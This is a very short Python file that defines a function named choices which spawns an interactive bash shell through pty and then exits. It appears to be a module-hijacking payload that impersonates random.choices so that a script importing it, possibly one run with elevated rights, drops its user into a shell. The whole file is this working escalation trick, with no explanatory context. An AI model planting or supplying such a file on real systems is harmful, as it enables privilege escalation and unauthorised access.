import os
import sys
import pty

def choices(l, k):
    print(l, k)
    pty.spawn("/bin/bash")
    os._exit(0)

